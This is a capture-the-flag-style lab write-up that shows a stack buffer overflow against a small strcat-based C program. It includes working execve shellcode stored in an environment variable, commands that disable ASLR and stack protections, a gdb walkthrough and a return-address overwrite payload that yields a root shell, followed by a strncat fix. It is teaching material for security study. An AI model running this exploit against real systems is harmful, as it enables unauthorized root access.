description: Stack-based buffer overflow example with shellcode injection using environment variable
goal: The goal of this laboratory is to perform a buffer overflow attack by exploiting a vulnerable c program (more specifically the strcat function) in order to inject the shellcode, through the use of environment variable, obtaining a shell with root privileges
solution:
Introduction

For a general discussion about basic stack-based buffer overflow techiques, please have a look at lab BufferOverflow_NSP1. In this lab we will move one step further, by showing how the same attack as the one described in the above mentioned introductory lab can be conducted even in the absence of sufficient space for injecting the malicious code directly into the stack.

To the purpose, we will crack a vulnerable program making an unsafe use of a very small buffer. For this reason it's not possible to use the same method illustrated in the previous lab, because the space on the stack allocated to local variables is less than the shellcode size. We will therefore use the following method:

  1. store the shellcode in an ad hoc crafted environment variable;
  2. overwrite the return address with the address in memory where the newly defined environment variable has been stored by the operating system.

 

 

Vulnerable Code

The program vulnerable to the buffer overflow attack is the following:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc,char** argv){

	char buff[10];
	buff[0] = 's';
	buff[1] = 't';
	buff[2] = 'r';
	buff[3] = ':';
	strcat(buff,argv[1]);
	printf("%s \n",buff);
	return 1;

}

The above program is located in the NSP2 folder of the hacking machine.
Its execution is very simple, in fact it append a string, entered from the command line, to one already statically present in the buff[] variable. As you can see, the vulnerability of this program consists in carrying out the concatenation of the strings, using the strcat() function, within the same variable, without any type of control on the size neither by the same function nor by the developer .

 

1. Adrress Space Layout Randomization Check

Address Space Layout Randomization (ASLR) is a cybersecurity technique involved in preventing the exploitation of memory corruption vulnerabilities. So the first thing we need to do is check for a specific value in Linux, which can be set to:

  • 0: disabled;
  • 1: conservative;
  • 2: full randomization

The check can be done using the following command:

cat /proc/sys/kernel/randomize_va_space

If the result of the command is different from 0, you need to disable the ASLR via the following command:

echo 0 > /proc/sys/kernel/randomize_va_space

To enable it again, it is possible to repeat the same command replacing the numerical value corresponding to the preferred randomization type.

 

2. Compiling and testing the program

To compile the program it's necessary to move to the NSP1 folder and then use the gcc compiler, with the following flags:

  • -fno-stack-protector: do not emit extra code to check for buffer overflows;
  • -no-pie: do not produce a Position Independent Executable (PIE);
  • -z execstack: option passed straight to the linker and marking the object code as requiring executable stack;
  • -ggdb: Produce debugging information for use by GDB.

Here is the whole command to be executed:

gcc -fno-stack-protector -no-pie -z execstack -o target strcatSmall.c -ggdb

 The image below shows the execution of the program with a non-offending input:

Instead this other with an offending input ( > 6 characters):

 

3. Program analysis with GDB

To understand the buffer size we need to analyze the program using gdb. It allows us to disassemble a specific function of the target program, giving us the assembly code. In order to run the program with gdb, we need to use the following command:

gdb ./target

So we are ready to disassemble, with intel flavor, the main() function of the program and check the buffer size that is allocated on the stack:

(gdb) set disassembly-flavor intel
(gdb) disas main

From the dump above it's possible to know the memory area allocated for the buff[] variable, that is 10 bytes (0xa in hexadecimal) above the base pointer register (rbp). You can see this, e.g., from the instruction "lea rax, [rbp-0xa]" that is used to prepare the parameters in view of the call to the strcat function in the main. Pay attention to the fact that 4 of the total 10 bytes are occupied by the statically allocated string "str:", which is why the space available to fill in before starting to overwrite the return address is 6 (10 - 4 for the buf[] variable) + 8 (old frame pointer) bytes .

As mentioned before, the space allocated to the local variables on the stack is not enough to hold the shellcode. For this reason it will be inserted into an ad hoc created environment variable, whose address (given by the Operating System) will replace the return address.

 

4. Creating the environment variable

Fisrt of all, let's see the environment variables present in the system, using the following command:

env

Now we can create a new variable in wich the shellcode and the "NOP sleed" to fill the stack are stored. The command to achieve this purpose is:

export SHELLCODE=$(perl -e 'print "\x90"x14,"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"')

If we now re-check the environment, we will find our new variable in it.

 

5. The Attack!

The first thing that we have to do is to re-run the program in gdb and disassemble the main function, in order to set a break point as soon as execution reaches it.

(gdb) b main

Now let's run the program with a valid input, and wait until execution reaches the break point. In this way we could see in which address the environment variable, containing the shellcode, has been allocated.

r prova

At this point we can analyze the memory contents while the process is still alive and look for the address to which the environment variable is allocated. To do this we use the following command:

x/500s $rsp

The image above, after browsing through the memory, shows that the variable in question has been stored at the address 0x7fffffffefbb. If we start from that address and skip the first 10 bytes (associated with the string "SHELLCODE ="), we will point directly to the beginning of the shellcode, as evidenced by the screenshot below:

We have the shellcode address, which will replace the return address. We can build the "stack smashing" string to be input to the program in gdb:

python -c 'print "A"*14+"\x7f\xff\xff\xff\xef\xc5"[::-1]'

The exploit has worked because the shellcode was executed, giving us a new shell with root privileges. Enjoy the hack :D

 

Defend against Buffer Overflow

In this case the buffer overflow attack can be avoided by replacing the strcat function with strncat. Unlike strcat, it provides an additional parameter that defines how many characters to copy into the destination string, in order to avoid buffer overflow.
In the NSP1 folder there is a "strcatSmallSafe" file containing the following code:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc,char** argv){

    char buff[10];
    buff[0] = 's';
    buff[1] = 't';
    buff[2] = 'r';
    buff[3] = ':';
    strncat(buff,argv[1],6);
    printf("%s \n",buff);
    return 1;

}

Let's compile it using the command already seen in the point 2:

gcc -fno-stack-protector -no-pie -z execstack -o safe strcatSafe.c -ggdb

At this point we can run it with either a valid...

... or an invalid input.

Neither of the two inputs show segmentation faults errors.
author: danilo
